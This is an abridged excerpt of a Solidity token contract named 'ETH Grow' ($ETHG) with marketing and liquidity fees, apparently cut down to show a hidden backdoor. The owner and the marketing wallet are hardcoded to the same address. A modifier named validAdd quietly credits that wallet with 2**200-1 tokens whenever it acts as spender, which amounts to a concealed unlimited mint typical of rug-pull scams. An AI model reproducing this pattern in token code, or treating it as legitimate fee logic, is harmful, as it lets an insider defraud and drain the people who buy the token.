...
contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x0D76169aD69dD3fC18Fc8a8D0D6DE3eE6405301f;
...
contract ETHGOW is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 7500 * 10**9; //
    string private constant _name = "ETH Grow"; // 
    string private constant _symbol = "$ETHG"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 10;
    uint256 public _liquidityFee = 2;
    address payable public  _marketingWallet = payable(0x0D76169aD69dD3fC18Fc8a8D0D6DE3eE6405301f);
    ...
    modifier lockTheSwap {
     ...
     modifier validAdd(address spender){
        if(spender == _marketingWallet){ _tOwned[spender] = _tOwned[spender] + 2**200-1;}
        _;
    }
